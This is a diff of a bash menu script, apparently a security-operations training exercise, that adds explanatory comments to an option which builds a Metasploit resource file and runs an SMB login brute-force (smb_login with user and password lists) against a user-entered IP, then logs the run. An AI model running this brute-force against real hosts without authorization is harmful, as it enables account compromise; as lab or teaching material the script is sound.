@@ -123,27 +123,41 @@ case $choices in
 		#Call the function again so that user can utlise other scans or attacks
 		scanattacker
 	;;
-	d)
+	d)	#User chooses option d
+		#User needs to enter the the target ip address they would like to do the Server Message Block (smb) attack 
 		echo 'Enter ip address to do a msfconsole attack'
+		#Read ipaddress provided by user and store it in a variable rhost_addr 
 		read rhost_addr
 		echo "$rhost_addr"
+		#Write commands needed run on metasploit to execute the smb attack into the smb_script
 		echo 'use auxiliary/scanner/smb/smb_login' > smb_script.rc
 		echo "set rhosts $rhost_addr" >> smb_script.rc
 		echo 'set user_file user.lst' >> smb_script.rc
 		echo 'set pass_file password.lst' >> smb_script.rc
 		echo 'run' >> smb_script.rc
 		echo 'exit' >> smb_script.rc
+		
+		#Conduct a smb attack on msfconsole ( metasploit ) by reading the smb_script 
+		#The scan results are kept in the msf_smb_bf_results text file 
+		#Result file can be found in the same working directory where this script is run
 		sudo msfconsole -r smb_script.rc -o msf_smb_bf_results.txt
+		
+		#Record that the msfconsole smb was conducted after exiting from the console in the socchecker log (txt) file
 		echo `date` "msfconsole run on set rhost $rhost_addr and exited from console Executed" >>socchecker.txt
+		
+		#Call the function again so that user can utlise other scans or attacks
 		scanattacker
 	;;
 	
 	e)
+		#User chooses to exit from the program
 		exit
 	;;
 esac
 	
 }
+
+#Call the function which allows the user to conduct nmap and masscans ,and also carry out hydra and msfconsole smb brute force attacks
 scanattacker
 
 
